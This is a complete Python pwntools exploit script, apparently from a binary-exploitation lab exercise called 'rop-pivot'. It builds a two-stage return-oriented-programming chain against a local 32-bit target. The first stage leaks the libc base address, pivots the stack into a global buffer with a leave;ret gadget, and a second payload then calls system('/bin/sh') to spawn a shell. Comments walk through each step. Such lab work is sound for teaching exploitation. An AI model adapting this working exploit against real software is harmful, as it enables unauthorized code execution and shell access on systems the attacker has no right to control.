import os

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

try:
    debug = os.environ["DEBUG"]
except KeyError:
    debug = False

if debug:
    TARGET = "./target"
else:
    TARGET = "/home/lab09/rop-pivot/target"

elf = ELF(TARGET)
LIBC = ELF("/lib/i386-linux-gnu/libc.so.6")

addr_leave_ret = 0x08049155
addr_pppr = 0x08049241
addr_pop_ebp = 0x08049243

addr_gbuf = elf.symbols["gbuf"]
addr_gbuf_f00 = addr_gbuf + 0xf00 # to store the 2nd payload

addr_write_plt = elf.plt["write"]
addr_read_plt = elf.plt["read"]
addr_setvbuf_got = elf.got["setvbuf"]

# 1. write@plt(1, setvbuf@got.plt, 4)
#    Leak libc base by writing setvbuf's resolved address
payload1  = b"AAAA"
payload1 += p32(addr_write_plt)
payload1 += p32(addr_pppr)
payload1 += p32(1)
payload1 += p32(addr_setvbuf_got)
payload1 += p32(4)

# 2. read@plt(0, addr_gbuf+0xf00, 16)
#    Call read() from stdin into &gbuf+0xf00 to store our 2nd payload
payload1 += p32(addr_read_plt)
payload1 += p32(addr_pppr)
payload1 += p32(0)
payload1 += p32(addr_gbuf_f00)
payload1 += p32(16)

# 3. Launch frame pointer attack again by setting EBP=&gbuf+0xf00
#    and returning to leave; ret; gadget so that it returns to the
#    2nd payload stored at &gbuf+0xf00
payload1 += p32(addr_pop_ebp)   # [a]
payload1 += p32(addr_gbuf_f00)
payload1 += p32(addr_leave_ret) # [b]

payload1 += b"B" * (280 - 4 * 16)
payload1 += p32(addr_gbuf)
payload1 += p32(addr_leave_ret)

if debug:
    p = gdb.debug([TARGET], gdbscript="""
break start
continue""")
else:
    p = process([TARGET])

p.recvline() # consume "Enter your input\n"

# Send the first payload
p.send(payload1)

# Read the 4 bytes printed by write(1, setvbuf@got.plt, 4);
addr_setvbuf = u32(p.recv(4))
libc_base = addr_setvbuf - LIBC.symbols["setvbuf"]
log.info("libc base: 0x%08X" % libc_base)

# After the write(), read(0, addr_gbuf+0xf00, 16); is executed
# and it is waiting for our input to stdin.

# Setup a fake stack frame to execute system("/bin/sh");
addr_system = libc_base + LIBC.symbols["system"]
addr_binsh = libc_base + list(LIBC.search(b"/bin/sh"))[0]
payload2  = b"AAAA"
payload2 += p32(addr_system)
payload2 += p32(0xdeadbeef)
payload2 += p32(addr_binsh)

# Send the second payload to read(), so it is stored at &gbuf+0xf00
p.send(payload2)

# After read(), pop ebp; ret; ([a]) makes ebp == &gbuf+0xf00
# Then, leave; ([b-1]) makes esp == &gbuf+0xf00+4, and finally,
# ret; ([b-2]) makes eip == &gbuf+0xf00+4, which indeed is addr_system.

p.interactive()
